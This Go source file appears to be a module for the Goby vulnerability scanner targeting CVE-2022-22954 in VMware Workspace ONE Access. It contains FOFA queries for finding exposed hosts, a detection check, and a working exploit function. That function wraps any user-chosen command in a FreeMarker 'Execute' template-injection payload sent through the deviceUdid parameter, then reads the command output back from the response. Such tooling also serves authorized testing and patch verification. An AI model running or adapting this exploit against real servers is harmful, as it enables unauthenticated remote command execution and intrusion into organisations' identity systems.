package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "VMware Workspace ONE Access & Identity Manager verify Api deviceUdid Params Remote Code Execution (CVE-2022-22954)",
    "Description": "<p>VMware Workspace ONE is an intelligence-driven digital workspace platform that lets you deliver and manage applications anywhere, anytime, on any device, in a simple and secure way.</p><p>VMware workspace one access and Identity Manager have a remote command execution vulnerability caused by server template injection, which can be exploited by unauthenticated attackers for remote arbitrary code execution.</p>",
    "Impact": "<p>VMware Workspace ONE Access &amp; Identity Manager Remote Code Execution (CVE-2022-22954)</p>",
    "Recommendation": "<p>At present, the official has released an updated patch. Please pay attention to:</p><p><a href=\"https://kb.vmware.com/s/article/88099\">https://kb.vmware.com/s/article/88099</a></p>",
    "Product": "VMware Workspace ONE Access",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "VMware Workspace ONE Access 及 Identity Manager verify 接口 Params 参数任意命令执行漏洞（CVE-2022-22954）",
            "Product": "VMware Workspace ONE Access",
            "Description": "<p><span style=\"font-size: 10pt;\">VMware Workspace ONE 是一款智慧导向的数位工作区平台，可让您随时随地在任何装置上以简单又安全的方式，交付及管理各种应用程式。<br></span></p><p><span style=\"font-size: 10pt;\">VMware Workspace ONE Access </span><span style=\"font-size: 10pt;\">及 </span><span style=\"font-size: 10pt;\">Identity Manager </span><span style=\"font-size: 10pt;\">存在一个由服务器模板注入导致的远程命令执行漏洞，未经身份验证的攻击者可以利用此漏洞进行远程任意代码执行。&nbsp;</span></p><p>\t\t\t\t\t</p><p>\t\t\t\t</p><p>\t\t\t</p><p>\t\t</p>",
            "Recommendation": "<p>目前官方已经发布更新补丁，请关注：</p><p><a href=\"https://kb.vmware.com/s/article/88099\">https://kb.vmware.com/s/article/88099</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 10pt;\">VMware Workspace ONE Access&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 10pt;\">及&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 10pt;\">Identity Manager&nbsp;</span><span style=\"color: rgb(22, 51, 102); font-size: 10pt;\">存在一个由服务器模板注入导致的远程命令执行漏洞，未经身份验证的攻击者可以利用此漏洞进行远程任意代码执行。&nbsp;</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "VMware Workspace ONE Access & Identity Manager verify Api deviceUdid Params Remote Code Execution (CVE-2022-22954)",
            "Product": "VMware Workspace ONE Access",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">VMware Workspace ONE is an intelligence-driven digital workspace platform that lets you deliver and manage applications anywhere, anytime, on any device, in a simple and secure way.<br></span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">VMware workspace one access and Identity Manager have a remote command execution vulnerability caused by server template injection, which can be exploited by unauthenticated attackers for remote arbitrary code execution.</span><br></p>",
            "Recommendation": "<p>At present, the official has released an updated patch. Please pay attention to:</p><p><a href=\"https://kb.vmware.com/s/article/88099\">https://kb.vmware.com/s/article/88099</a></p>",
            "Impact": "<p>VMware Workspace ONE Access &amp; Identity Manager Remote Code Execution (CVE-2022-22954)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\"))||(banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE® Assist\")",
    "GobyQuery": "(title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\"))||(banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE® Assist\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://docs.vmware.com/cn/VMware-Workspace-ONE-Access/index.html",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-22954"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10265"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			r1 := rand.New(rand.NewSource(time.Now().UnixNano()))
			randomInt1 := 10 + r1.Intn(10-1)
			r2 := rand.New(rand.NewSource(time.Now().UnixNano()))
			randomInt2 := 10 + r2.Intn(10-1)
			randomInt := randomInt1 * randomInt2
			functionRouterCFG := httpclient.NewGetRequestConfig("/catalog-portal/ui/oauth/verify?deviceUdid=%24%7B" + strconv.Itoa(randomInt1) + "%2A" + strconv.Itoa(randomInt2) + "%7D&code=122&status=adadad")
			functionRouterCFG.VerifyTls = false
			functionRouterCFG.FollowRedirect = false
			functionRouterCFG.Timeout = 15
			if resp, err := httpclient.DoHttpRequest(u, functionRouterCFG); err == nil {
				if resp.StatusCode == 400 &&
					strings.Contains(resp.Header.Get("Set-Cookie"), "EUC_XSRF_TOKEN") &&
					strings.Contains(resp.Utf8Html, "device id: "+strconv.Itoa(randomInt)) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			if cmd == "" {
				expResult.Output = ""
				expResult.Success = false
				return expResult
			}
			payload := "${\"freemarker.template.utility.Execute\"?new()(\"" + cmd + "\")}"
			payload = url.QueryEscape(payload)
			functionRouterCFG := httpclient.NewGetRequestConfig("/catalog-portal/ui/oauth/verify?deviceUdid=" + payload + "&code=122&status=adadad")
			functionRouterCFG.VerifyTls = false
			functionRouterCFG.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, functionRouterCFG); err == nil {
				if resp.StatusCode == 400 &&
					strings.Contains(resp.Header.Get("Set-Cookie"), "EUC_XSRF_TOKEN") &&
					strings.Contains(resp.Utf8Html, "device id: ") {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`(?s)device id: (.*?), device type`).FindStringSubmatch(resp.RawBody)[1]
					return expResult
				}
			}
			return expResult
		},
	))
}
